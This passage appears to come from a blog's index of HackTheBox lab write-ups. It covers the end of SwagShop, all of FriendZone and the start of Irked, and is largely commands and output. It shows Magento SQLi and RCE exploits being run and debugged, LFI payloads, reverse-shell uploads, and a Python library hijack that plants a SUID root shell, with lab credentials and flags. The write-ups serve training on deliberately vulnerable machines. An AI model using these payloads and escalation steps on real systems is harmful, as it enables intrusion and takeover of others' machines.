http://10.10.10.140/install.php 301 GET 9l 28w 309c http://10.10.10.140/js =&amp;gt; http://10.10.10.140/js/ 301 GET 9l 28w 310c http://10.10.10.140/lib =&amp;gt; http://10.10.10.140/lib/ 301 GET 9l 28w 312c http://10.10.10.140/media =&amp;gt; http://10.10.10.140/media/ 301 GET 9l 28w 314c http://10.10.10.140/pkginfo =&amp;gt; http://10.10.10.140/pkginfo/ 301 GET 9l 28w 312c http://10.10.10.140/shell =&amp;gt; http://10.10.10.140/shell/ 301 GET 9l 28w 311c http://10.10.10.140/skin =&amp;gt; http://10.10.10.140/skin/ 301 GET 9l 28w 310c http://10.10.10.140/var =&amp;gt; http://10.10.10.140/var/ Nikto ┌──(root💀kali)-[~/htb/swagshop] └─# nikto -h swagshop.htb /RELEASE_NOTES.txt: A database error may reveal internal details about the running database. /RELEASE_NOTES.txt: Magento Shop Changelog identified. RELEASE_NOTES.txt Initial Foothold - 1TCP/80 (HTTP) - Enumerating Magento CMS View RELEASE_NOTES.txt ┌──(root💀kali)-[~/htb/swagshop/10.10.10.140/loot] └─# curl -s http://swagshop.htb/RELEASE_NOTES.txt | head -n 13 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ NOTE: Current Release Notes are maintained at: http://www.magentocommerce.com/knowledge-base/entry/ce-19-later-release-notes ==== 1.7.0.2 ==== === Fixes === Fixed: Security vulnerability in Zend_XmlRpc - http://framework.zend.com/security/advisory/ZF2012-01 magento 1.7.0.2 After looking at the page source, noticed something interesting /index.php/&amp;lt;directory&amp;gt; if index.php is not prepended, the path does not exist (404) Directory enumerate http://swagshop.htb/index.php/FUZZ ┌──(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# ffuf -u http://swagshop.htb/index.php/FUZZ -w /usr/share/wordlists/dirb/common.txt [Status: 200, Size: 16097, Words: 3204, Lines: 328] 0 [Status: 200, Size: 16097, Words: 3204, Lines: 328] admin [Status: 200, Size: 3609, Words: 717, Lines: 52] /admin Enumerate Magento Download MageScan Enumerate Magento, run all scans ┌──(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# php magescan.phar scan:all http://swagshop.htb Magento Information +-----------+------------------+ | Parameter | Value | +-----------+------------------+ | Edition | Community | | Version | 1.9.0.0, 1.9.0.1 | +-----------+------------------+ Unreachable Path Check +----------------------------------------------+---------------+--------+ | Path | Response Code | Status | | app/etc/local.xml | 200 | Fail | | shell/ | 200 | Fail | | index.php/rss/order/NEW/new | 200 | Fail | | var/report/ | 200 | Fail | | var/export/ | 200 | Fail | +----------------------------------------------+---------------+--------+ Magento v1.9.0.0, 1.9.0.1 app/etc/local.xml Found some credentials in /app/etc/local.xml &amp;lt;crypt&amp;gt; &amp;lt;key&amp;gt;&amp;lt;![CDATA[b355a9e0cd018d3f7f03607141518419]]&amp;gt;&amp;lt;/key&amp;gt; &amp;lt;/crypt&amp;gt; &amp;lt;connection&amp;gt; &amp;lt;host&amp;gt;&amp;lt;![CDATA[localhost]]&amp;gt;&amp;lt;/host&amp;gt; &amp;lt;username&amp;gt;&amp;lt;![CDATA[root]]&amp;gt;&amp;lt;/username&amp;gt; &amp;lt;password&amp;gt;&amp;lt;![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]&amp;gt;&amp;lt;/password&amp;gt; &amp;lt;dbname&amp;gt;&amp;lt;![CDATA[swagshop]]&amp;gt;&amp;lt;/dbname&amp;gt; &amp;lt;initStatements&amp;gt;&amp;lt;![CDATA[SET NAMES utf8]]&amp;gt;&amp;lt;/initStatements&amp;gt; &amp;lt;model&amp;gt;&amp;lt;![CDATA[mysql4]]&amp;gt;&amp;lt;/model&amp;gt; &amp;lt;type&amp;gt;&amp;lt;![CDATA[pdo_mysql]]&amp;gt;&amp;lt;/type&amp;gt; &amp;lt;pdoType&amp;gt;&amp;lt;![CDATA[]]&amp;gt;&amp;lt;/pdoType&amp;gt; &amp;lt;active&amp;gt;1&amp;lt;/active&amp;gt; &amp;lt;/connection&amp;gt; b355a9e0cd018d3f7f03607141518419 root:fMVWh7bDHpgZkyfqQXreTjU9 Tried to login w/ root:fMVWh7bDHpgZkyfqQXreTjU9 at index.php/admin, failedTCP/80 (HTTP) - Magento SQLi , adding new admin user Search exploits for Magento v1.9 Exploit Title Path Magento &amp;lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File php/webapps/39838.php Magento CE &amp;lt; 1.9.0.1 - (Authenticated) Remote Code Execution php/webapps/37811.py Magento eCommerce - Local File Disclosure php/webapps/19793.txt Magento eCommerce - Remote Code Execution xml/webapps/37977.py Try xml/webapps/37977.py How does it work? This exploit is leveraging SQL Injection (SQLi) and inserting a new admin_user to the database. Change some variables in the code # Before target = &quot;http://target.com/&quot; # After target = &quot;http://swagshop.htb/index.php&quot; Execute it ┌──(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# python 37977.py WORKED Check http://swagshop.htb/index.php/admin with creds forme:forme Successfully login w/ forme:forme Now we have to do RCE to obtain a shellTCP/80 (HTTP) - Magento RCE Try php/webapps/37811.py How does it work? This exploit takes advantage of the same vulnerability as earlier, to do remote code execution. It is supposed to be carried out after obtaining valid credential from the exploit we did earlier. This exploit requires some debugging and does not work out of the box. Fix python2 compatibility w/ virtualenv Fix/Debug the exploit so that it works TCP/80 (HTTP) - Magento RCE, creating python2 environment The first issue is python2 compatibility, we have to create a python2 environment ┌──(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# python 37811.py Traceback (most recent call last): File &quot;37811.py&quot;, line 16, in &amp;lt;module&amp;gt; import mechanize ImportError: No module named mechanize Create our python2 environment Create virtualenv ┌──(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# virtualenv magento-exploit -p $(which python2) created virtual environment CPython2.7.18.final.0-64 in 2333ms creator CPython2Posix(dest=/root/htb/swagshop/10.10.10.140/exploit/magento-exploit, clear=False, no_vcs_ignore=False, global=False) seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/root/.local/share/virtualenv) added seed packages: pip==20.3.4, setuptools==44.1.1, wheel==0.37.1 activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator Activate the environment ┌──(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# source magento-exploit/bin/activate ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# Install pip ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# wget https://bootstrap.pypa.io/pip/2.7/get-pip.py ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# python get-pip.py Install mechanize python library ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# pip install mechanize Run exploit ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# python2 37811.py http://swagshop.htb/index.php &quot;uname -a&quot; Traceback (most recent call last): File &quot;37811.py&quot;, line 56, in &amp;lt;module&amp;gt; br[&#39;login[password]&#39;] = password File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_mechanize.py&quot;, line 809, in __setitem__ self.form[name] = val File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_form_controls.py&quot;, line 1963, in __setitem__ control = self.find_control(name) File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_form_controls.py&quot;, line 2355, in find_control return self._find_control(name, type, kind, id, label, predicate, nr) File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_form_controls.py&quot;, line 2448, in _find_control raise ControlNotFoundError(&quot;no control matching &quot; + description) mechanize._form_controls.ControlNotFoundError: no control matching name &#39;login[password]&#39; no control matching name &#39;login[password]&#39; Debugging 37811.pyTCP/80 (HTTP) - Magento RCE, debugging/fixing the exploit Change Config options # Config. username = &#39;forme&#39; password = &#39;forme&#39; php_function = &#39;system&#39; install_date = &#39;Wed, 08 May 2019 07:23:09 +0000&#39; # Obtained from /app/etc/local.xml Fix no control matching name &#39;login[password]&#39; Gets the response of the specified URL, store it in request request = br.open(target) Select the first form it sees br.select_form(nr=0) Add username control br.form.new_control(&#39;text&#39;, &#39;login[username]&#39;, {&#39;value&#39;: username}) Normalise form after all controls have been added. br.form.fixup() Set username field to our specified username &amp;amp; password - forme:forme br[&#39;login[username]&#39;] = username br[&#39;login[password]&#39;] = password Earlier, http://swagshop.htb/index.php is specified, therefore, the login form is not there, instead we have to change the URL to http://swagshop.htb/index.php/admin ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# python2 37811.py http://swagshop.htb/index.php/admin &quot;uname -a&quot; Traceback (most recent call last): File &quot;37811.py&quot;, line 55, in &amp;lt;module&amp;gt; br[&#39;login[username]&#39;] = username File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_mechanize.py&quot;, line 809, in __setitem__ self.form[name] = val File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_form_controls.py&quot;, line 1963, in __setitem__ control = self.find_control(name) File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_form_controls.py&quot;, line 2355, in find_control return self._find_control(name, type, kind, id, label, predicate, nr) File &quot;/root/htb/swagshop/10.10.10.140/exploit/magento-exploit/lib/python2.7/site-packages/mechanize/_form_controls.py&quot;, line 2446, in _find_control description) mechanize._form_controls.AmbiguityError: more than one control matching name &#39;login[username]&#39; more than one control matching name &#39;login[username]&#39; Fix more than one control matching name &#39;login[username]&#39; The error is suggesting that there are more than one login[username], which is strange Simply google the error, found this Modified code # Add br.select_form(nr=0) userone = br.find_control(name=&quot;login[username]&quot;, nr=0) userone.value = username pwone = br.find_control(name=&quot;login[password]&quot;, nr=0) pwone.value = password We are all done! ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# python2 37811.py http://swagshop.htb/index.php/admin &quot;uname -a&quot; Demo - Magento RCE Initial Foothold - 2TCP/80 (HTTP) - Magento RCE via Uploading a reverse shell After rooting the machine, I saw a post that shows another way to obtain www-data Prerequisite: Insert an admin user w/ xml/webapps/37977.py Login to index.php/admin We are able to upload a reverse shell by adding an upload function into one of the products Proceed to Catalog -&amp;gt; Manage Products -&amp;gt; Any Product -&amp;gt; Custom Options Head back to index.php, Select the 5x Hack The Box Sticker Upload php-reverse-shell.php Add to cart Start listener Execute reverse shell ┌──(magento-exploit)(root💀kali)-[~/htb/swagshop/10.10.10.140/exploit] └─# curl http://swagshop.htb/media/custom_options/quote/p/h/e2075b164cf1b49a228f961afec5db7b.php Privilege EscalationRoot - Via SUDO GTFOBins Check www-data sudo access www-data@swagshop:/var/www/html$ sudo -l Matching Defaults entries for www-data on swagshop: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on swagshop: (root) NOPASSWD: /usr/bin/vi /var/www/html/* vi - has a GTFOBins entry Using vi to privilege escalate How does it work? If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges, we are able to spawn a shell w/ !bash Privilege Escalate www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/* # Type :!bash Root Obtained " }, { "title": "HackTheBox - FriendZone", "url": "/posts/FriendZone/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-inclusion/lfi, linux-priv-esc/python-hijacking", "date": "2022-09-11 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a network enumeration w/ nmap, a domain name is enumerated friendzone.red, DNS enumeration w/ dig is carried out to enumerate subdomains. uploads.friendzone.red &amp;amp; administrator1.friendzone.red.Next, there are 2 file share discovered, Development - RW access &amp;amp; general - R access. Credentials can be exfiltrated from general fileshare, revealing credentials for a login page in administrator1.friendzone.red.After successfully login, our cookie is created, allowing us to access dashboard.php where it is susceptible to LFI. On dashboard.php, the GET parameter pagename is susceptible to LFI, allowing us to include any file that has a .php extension. We are able to upload php-reverse-shell.php using the SMB Fileshare Development, allowing us to obtain a low-privilege/www-data shell.For the privilege escalation part, we have to privilege escalate twice, to friend and then to root. On www-data home directory, there is a file that contains credentials to friend, allowing us to privilege escalate to friend.After enumerating the system w/ linpeas.sh, there is a directory called /opt/server_admin, that is out of the norm, inside it resides a python script that imports os library to print something. Through pspy64, it is discovered that the python script is executed every 2 minutes as root. It is exploitable because the library that it is importing is writable, allowing us to replace the library (os.py) w/ a python script that will create rootbash, allowing us to privilege escalate to root.If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LFI), HackTheBox Nineveh (LFI), TryHackMe Wonderland (Python Library Hijacking), TryHackMe Revenant (Upload Reverse Shell). Column Details Box Name FriendZone IP 10.10.10.123 Points - Difficulty Easy Creator askar Release Date 09-Feb-2019 ReconTCP/80 (HTTP) FFUF 200 GET 1l 2w 13c http://10.10.10.123/robots.txt403 GET 11l 32w 300c http://10.10.10.123/server-status301 GET 9l 28w 316c http://10.10.10.123/wordpress =&amp;gt; http://10.10.10.123/wordpress/ robots.txt wordpressTCP/139, 445 (SMB) SMBMap ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb] └─# smbmap -H friendzone.htb [+] Guest session IP: friendzone.htb:445 Name: unknown Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files Development READ, WRITE FriendZone Samba Server Files IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) general - R Development - RW TCP/443 (HTTPS) NMAP PORT STATE SERVICE REASON VERSION 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.29 | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED | Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED Subdomain friendzone.red TCP/UDP/53 (DNS) DIG - Zone Transfer ┌──(root💀kali)-[~/htb/friendzone] └─# dig axfr @10.10.10.123 friendzone.red ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.0-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.123 friendzone.red ; (1 server found) ;; global options: +cmd friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red. 604800 IN AAAA ::1 friendzone.red. 604800 IN NS localhost. friendzone.red. 604800 IN A 127.0.0.1 administrator1.friendzone.red. 604800 IN A 127.0.0.1 hr.friendzone.red. 604800 IN A 127.0.0.1 uploads.friendzone.red. 604800 IN A 127.0.0.1 friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 35 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP) ;; WHEN: Sun Sep 11 16:11:47 +08 2022 ;; XFR size: 8 records (messages 1, bytes 289) Subdomains administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red. Initial FootholdTCP/139, 445 (SMB) - File Exfiltration Download all files from general &amp;amp; Development SMB fileshare ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/general] └─# smbclient //friendzone.htb/general -c &#39;prompt;recurse;mget *&#39; Password for [WORKGROUP\\root]: getting file \\creds.txt of size 57 as creds.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec) ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/general] └─# cat creds.txt creds for the admin THING: admin:WORKWORKHhallelujah@# ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/development] └─# smbclient //friendzone.htb/Development -c &#39;prompt;recurse;mget *&#39; Password for [WORKGROUP\\root]: # No files for Development admin:WORKWORKHhallelujah@# TCP/443 (HTTP) - Enumerating friendzone.red In the page source of index, saw something interesting &amp;lt;!-- Just doing some development here --&amp;gt; &amp;lt;!-- /js/js --&amp;gt; &amp;lt;!-- Don&#39;t go deep ;) --&amp;gt; Proceed to /js/js Random base64 encoded characters is displayed Tried to enumerate some GET parameters, nothing interesting is found Based on that, I think it is a rabbit-hole.TCP/443 (HTTP) - Enumerating uploads.friendzone.red Directory enumerate the uploads.friendzone.red uploads.friendzone.red. ┌──(root💀kali)-[~/htb/friendzone] └─# ffuf -u https://uploads.friendzone.red/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.php,.txt&#39; files [Status: 301, Size: 334, Words: 20, Lines: 10] upload.php [Status: 200, Size: 38, Words: 8, Lines: 1] files Files uploaded by upload.php does not end up here OR the uploaded files are renamed Attempt to upload a file, regardless of whatever the file is, even if nothing is uploaded, it says successfully uploaded. Based on that, I think it is a rabbit-hole.TCP/443 (HTTP) - Enumerating administrator1.friendzone.red Directory enumerate the administrator1.friendzone.red administrator1.friendzone.red ┌──(root💀kali)-[~/htb/friendzone] └─# ffuf -u https://administrator1.friendzone.red/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.php,.txt&#39; images [Status: 301, Size: 349, Words: 20, Lines: 10] login.php [Status: 200, Size: 7, Words: 2, Lines: 1] dashboard.php [Status: 200, Size: 101, Words: 12, Lines: 1] timestamp.php [Status: 200, Size: 36, Words: 5, Lines: 1] [Status: 200, Size: 2873, Words: 393, Lines: 123] .php [Status: 403, Size: 309, Words: 22, Lines: 12] server-status [Status: 403, Size: 318, Words: 22, Lines: 12] :: Progress: [442314/661638] :: Job [1/1] :: 1106 req/sec :: Duration: [0:06:54] :: Errors: 0 :: images Contains 2 .jpg images, used in dashboard.php timestamp.php Displays timestamp, used in dashboard.php Proceed to administrator1.friendzone.red &amp;amp; login w/ admin:WORKWORKHhallelujah@# Proceed to /dashboard.php image_id=a.jpg&amp;amp;pagename=timestamp timestamp - earlier we enumerated it, the webpage is including timestamp.php Enumerating GET parameters image_id Able to display images from /image directory Enumerated it against LFI &amp;amp; Command Injection payloads, nothing is displayed, this is because the webpage is coded to only display images. # Hypothesis &amp;lt;center&amp;gt;&amp;lt;img src=&#39;images/$_GET[&#39;image_id&#39;]&#39;&amp;gt;&amp;lt;/center&amp;gt; pagename Based on how the webpage included timestamp, we are able to assume that .php is appended before the file is included. # Hypothesis include $_GET[pagename] . &#39;.php&#39; We are able to view the source code of the webpage by “exploiting” GET parameter pagename by base64 encoding it timestamp.php ┌──(root💀kali)-[~/htb/friendzone] └─# curl -ks -H &quot;Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100&quot; &#39;https://administrator1.friendzone.red/dashboard.php?image_id=test&amp;amp;pagename=php://filter/convert.base64-encode/resource=timestamp&#39; | cut -d &#39;&amp;gt;&#39; -f21 | base64 -d &amp;lt;?php $time_final = time() + 3600; echo &quot;Final Access timestamp is $time_final&quot;; ?&amp;gt; Nothing interesting dashboard.php ┌──(root💀kali)-[~/htb/friendzone] └─# curl -ks -H &quot;Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100&quot; &#39;https://administrator1.friendzone.red/dashboard.php?image_id=test&amp;amp;pagename=php://filter/convert.base64-encode/resource=dashboard&#39; | cut -d &#39;&amp;gt;&#39; -f21 | base64 -d &amp;lt;?php //echo &quot;&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;Smart photo script for friendzone corp !&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;&quot;; //echo &quot;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&quot;; echo &quot;&amp;lt;title&amp;gt;FriendZone Admin !&amp;lt;/title&amp;gt;&quot;; $auth = $_COOKIE[&quot;FriendZoneAuth&quot;]; if ($auth === &quot;e7749d0f4b4da5d03e6e9196fd1d18f1&quot;){ echo &quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;; echo &quot;&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;Smart photo script for friendzone corp !&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;&quot;; echo &quot;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&quot;; if(!isset($_GET[&quot;image_id&quot;])){ echo &quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;; echo &quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;image_name param is missed !&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&quot;; echo &quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;please enter it to show the image&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&quot;; echo &quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;default is image_id=a.jpg&amp;amp;pagename=timestamp&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&quot;; }else{ $image = $_GET[&quot;image_id&quot;]; echo &quot;&amp;lt;center&amp;gt;&amp;lt;img src=&#39;images/$image&#39;&amp;gt;&amp;lt;/center&amp;gt;&quot;; echo &quot;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Something went worng ! , the script include wrong param !&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&quot;; include($_GET[&quot;pagename&quot;].&quot;.php&quot;); //echo $_GET[&quot;pagename&quot;]; } }else{ echo &quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;You can&#39;t see the content ! , please login !&amp;lt;/center&amp;gt;&amp;lt;/p&amp;gt;&quot;; } ?&amp;gt; Based on this, we are able to do directory traversal and include a file w/ .php extension We are able to spawn a shell if we are able to somehow upload a php-reverse-shell.php. Earlier, while enumerating TCP/139,445 (SMB), there is a fileshare Development that we have RW access to itTCP/139, 445 (SMB) - Upload php-reverse-shell.php Upload a php-reverse-shell.php ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/development] └─# smbclient //friendzone.htb/Development Password for [WORKGROUP\\root]: Try &quot;help&quot; to get a list of possible commands. smb: \\&amp;gt; put php-reverse-shell.php putting file php-reverse-shell.php as \\php-reverse-shell.php (49.7 kb/s) (average 49.7 kb/s) smb: \\&amp;gt; ls . D 0 Sun Sep 11 03:08:14 2022 .. D 0 Thu Jan 24 05:51:02 2019 php-reverse-shell.php A 5493 Sun Sep 11 03:08:14 2022 9221460 blocks of size 1024. 6214168 blocks available The comment of Files fileshare is key to uncovering the FULL PATH of Development fileshare on the system ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb] └─# smbmap -H friendzone.htb [+] Guest session IP: friendzone.htb:445 Name: unknown Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files Development READ, WRITE FriendZone Samba Server Files IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) We can assume that Development fileshare resides in /etc/Development TCP/443 (HTTPS) - Execute reverse shell Start a listener ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Execute our reverse shell ┌──(root💀kali)-[~/htb/friendzone] └─# curl -ks -H &quot;Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100&quot; &#39;https://administrator1.friendzone.red/dashboard.php?image_id=test&amp;amp;pagename=../../../../../etc/Development/php-reverse-shell&#39; www-data shell obtained User Flag www-data@FriendZone:/var/www$ cd /home www-data@FriendZone:/home$ ls friend www-data@FriendZone:/home$ cd friend www-data@FriendZone:/home/friend$ ls user.txt www-data@FriendZone:/home/friend$ cat user.txt a9ed20acecd6c5b6b52f474e15ae9a11 www-data@FriendZone:/home/friend$ Demo - LFI2RCE Privilege EscalationFriend - Via File containing creds Found something interesting in /var/www www-data@FriendZone:/var/www$ ls -l total 28 drwxr-xr-x 3 root root 4096 Jan 16 2019 admin drwxr-xr-x 4 root root 4096 Oct 6 2018 friendzone drwxr-xr-x 2 root root 4096 Oct 6 2018 friendzoneportal drwxr-xr-x 2 root root 4096 Jan 15 2019 friendzoneportaladmin drwxr-xr-x 3 root root 4096 Oct 6 2018 html -rw-r--r-- 1 root root 116 Oct 6 2018 mysql_data.conf drwxr-xr-x 3 root root 4096 Oct 6 2018 uploads www-data@FriendZone:/var/www$ cat mysql_data.conf for development process this is the mysql creds for user friend db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ www-data@FriendZone:/var/www$ friend:Agpyu12!0.213$ SSH w/ friend:Agpyu12!0.213$ ┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot] └─# sshpass -p &#39;Agpyu12!0.213$&#39; ssh friend@friendzone.htb Root - Via Python Library Hijacking Found something interesting w/ linpeas.sh server_admin View files in server_admin directory friend@FriendZone:/tmp$ ls -la /opt/server_admin/ total 12 drwxr-xr-x 2 root root 4096 Jan 24 2019 . drwxr-xr-x 3 root root 4096 Oct 6 2018 .. -rwxr--r-- 1 root root 424 Jan 16 2019 reporter.py There should be a cronjob executing reporter.py Verify that there is a cronjob running w/ pspy64 There is a cronjob executing /opt/server_admin/reporter.py as root every 2 minutes View contents of /opt/server_admin/reporter.py friend@FriendZone:/tmp$ cat /opt/server_admin/reporter.py #!/usr/bin/python import os to_address = &quot;admin1@friendzone.com&quot; from_address = &quot;admin2@friendzone.com&quot; print &quot;[+] Trying to send email to %s&quot;%to_address #command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&#39;&#39;&#39; #os.system(command) # I need to edit the script later # Sam ~ python developer We can potentially do python library hijacking Exploiting reporter.py How do we exploit reporter.py Python code in one module gains access to the code in another module by the process of importing it. If we have write access to the library (os.py) that reporter.py is importing, we are able to replace it w/ a python script to create rootbash rootbash - /bin/bash w/ SUID bit set. Check if library os writable friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os os.py - RWX Make a copy of os.py called os_bak.py friend@FriendZone:/usr/lib/python2.7$ cp /usr/lib/python2.7/os.py /usr/lib/python2.7/os_bak.py We’ll need this for writing our python script to create rootbash Create our python script called os.py friend@FriendZone:/tmp$ cat os.py import os_bak os_bak.system(&quot;cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash&quot;) Replace /usr/lib/python2.7/os.py w/ /tmp/os.py friend@FriendZone:/tmp$ cp /tmp/os.py /usr/lib/python2.7/os.py Wait for cronjob to execute, rootbash will be created Obtain root friend@FriendZone:/tmp$ /tmp/rootbash -p Root Flag rootbash-4.4# cat root.txt b0e6c60b82cf96e9855ac1656a9e90c7 Demo - Python Library Hijacking Privilege Escalation " }, { "title": "HackTheBox - Irked", "url": "/posts/Irked/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/suid/unknown-exec, image-forensics", "date": "2022-09-10 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ network enumeration w/ nmap, detecting Unrealircd running on port 6697, it is susceptible to a backdoor command execution, allowing us to obtain an irc user shell.For the privilege escalation part, an unknown suid binary viewuser is enumerated is found after enumerating the system w/ linpeas.sh. It is executing a file called /tmp/listusers that does exist, since the file resides in /tmp directory we are able to create a bash script to privilege escalate us to root when viewuser is executed. Column Details Box Name Irked IP 10.10.10.117 Points - Difficulty Easy Creator MrAgent Release Date 17-Nov-2018 ReconTCP/80 (HTTP) Nothing interesting eumeratedTCP/6697, 8067, 65534 - irc NMAP nmap -vv --reason -Pn -T4 -T4 -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -oN /root/htb/irked/10.10.10.117/scans/tcp65534/tcp_65534_irc_nmap.txt -oX /root/htb/irked/10.10.10.117/scans/tcp65534/xml/tcp_65534_irc_nmap.xml -p 65534 10.10.10.117 PORT STATE SERVICE REASON VERSION 65534/tcp open irc syn-ack ttl 63 UnrealIRCd (Admin email djmardov@irked.htb) | irc-botnet-channels: |_ ERROR: Closing Link: [10.10.14.17] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information. UnrealIRCd Initial FootholdTCP/6697, 8067, 65534 (IRC) - UnrealIRCd 3.2.8.1 Backdoor Command Execution w/ Metasploit Search exploits for `UnrealIRCd Exploit Title Path UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) linux/remote/16922.rb UnrealIRCd 3.2.8.1 - Local Configuration Stack Ove windows/dos/18011.txt UnrealIRCd 3.2.8.1 - Remote Downloader/Execute linux/remote/13853.pl UnrealIRCd 3.x - Remote Denial of Service windows/dos/27407.pl Launch msfconsole Search for UnrealIRCd and use exploit/unix/irc/unreal_ircd_3281_backdoor 